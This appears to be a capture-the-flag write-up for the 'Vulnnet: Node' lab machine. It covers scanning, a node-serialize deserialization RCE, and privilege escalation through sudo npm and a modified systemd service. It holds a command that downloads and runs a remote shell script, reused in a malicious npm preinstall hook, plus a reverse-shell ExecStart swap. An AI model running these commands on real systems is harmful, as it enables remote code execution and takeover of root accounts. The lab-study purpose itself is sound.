# Vulnnet: Node

## Nmap scanning 
	
cmd: ```sudo nmap -oN nmap/simple 10.10.9.165```

- 8080/tcp open  http-proxy
	
cmd: ```sudo nmap -sC -sV -p 8080 10-10-9-165```

- 8080/tcp open  http    Node.js Express framework

cmd: ```sudo nmap -p- -oN nmap/all_ports 10.10.9.165```
	
- No findings	

## Interesting findings

### Potential users
	
- Tilo Mitra
- Eric Ferraiuolo
- Reid Burke
- Andrew Wooldridge
		
### Intersting posts (looks like a news page)
	
1. Vulnnet data breach -> might find passwords somewhere
2. Critical flaws in D-Link VPN routers -> nmap identified this might be a proxy, thus we might abuse this
3. Some photos -> OSINT and STEGA
4. Node.js vulnerabilities still present -> always good for us

### Pages (with gobuster)
	
	cmd: ```gobuster dir -u http://10.10.9.165 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o fuzz/big.log -t 80```
	
```bash
/Login                (Status: 200) [Size: 2127]
/css                  (Status: 301) [Size: 173] [--> /css/]
/img                  (Status: 301) [Size: 173] [--> /img/]
/login                (Status: 200) [Size: 2127]
```

### Analyzing photos
	
- Exiftool -> no findings
- Stegseek -> no findings
- Visual inspection -> some elements in some stickers, but nothing major for now


### Analyzing HTTP requests/responses
	
- X-Powered-By: Express
- Button "Let me in..." -> GET /login (does nothing)
- Button "Let me back..." -> GET / (onclick="document.location.href='/'")

## Exploitation
	
cmd: ```searchsploit node.js```
	
```bash
Node.JS - 'node-serialize' Remote Code Execution (2)  | nodejs/webapps/49552.py
```

- Modify the script
	- Cookie Key: session
	- Cookie Value: deserialization exploitation payload
	
- Payload: ```curl http://10.9.128.84/shell.sh | bash```
	- Note: bash one liner reverse shell was causing problems with the quotation 

## Enumeration
	
cmd: ```whoami && id```

```bash
www
uid=1001(www) gid=1001(www) groups=1001(www)
```

cmd: ```sudo -l```

```bash
(serv-manage) NOPASSWD: /usr/bin/npm
```

## Exploitation (user)
	
- check gtfobins
- cmd: ```echo '{"scripts": {"preinstall": "curl http://10.9.128.84/shell.sh | bash"}}' > package.json```
- cmd: ```sudo -u serv-manage npm -C . --unsafe-perm i```


## Enumeration 
	
cmd: ```whoami && id```
	
```bash
serv-manage
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

cmd: ```sudo -l```

```bash
User serv-manage may run the following commands on vulnnet-node:
(root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl daemon-reload
```


## Exploitation
	
- finding the timer

cmd: ```find / -name "vulnnet-auto.timer"  2>/dev/null```

```bash
/etc/systemd/system/vulnnet-auto.timer
```

- Auto-timer important stuff
	- Change the 30 to 1 to execute more often
	- Unit= vulnnet-job.service

- Finding the service 

cmd: ```find / -name "vulnnet-auto.timer"  2>/dev/null```
	
```bash
/etc/systemd/system/vulnnet-job.service
```

- modifying the service
	
```bash
ExecStart=/bin/df -> ExecStart=/dev/shm/give_me_root # simple bash reverse shell with 777 permissions (make sure everyone can execute it)
```
	
cmd: ```whoami && id```
	
```bash
root
uid=0(root) gid=0(root) groups=0(root)
``` 

	

